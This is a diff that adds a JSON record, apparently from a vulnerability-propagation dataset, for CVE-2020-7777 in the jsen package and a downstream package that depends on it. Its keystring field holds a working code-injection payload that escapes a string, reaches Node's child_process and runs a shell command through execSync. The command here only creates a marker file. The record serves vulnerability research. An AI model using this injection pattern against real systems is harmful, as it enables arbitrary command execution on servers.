@@ -1,0 +1,10 @@
+{
+  "id": "CVE-2020-7777",
+  "upstream": "jsen@0.6.0",
+  "keymethod": "validate",
+  "keystring": "\"+clearImmediate.constructor(`return process;`)().mainModule.require(`child_process`).execSync('touch jsen')+\"",
+  "location": "",
+  "downstreams": [
+    "monocle-api@0.2.1"
+  ]
+}
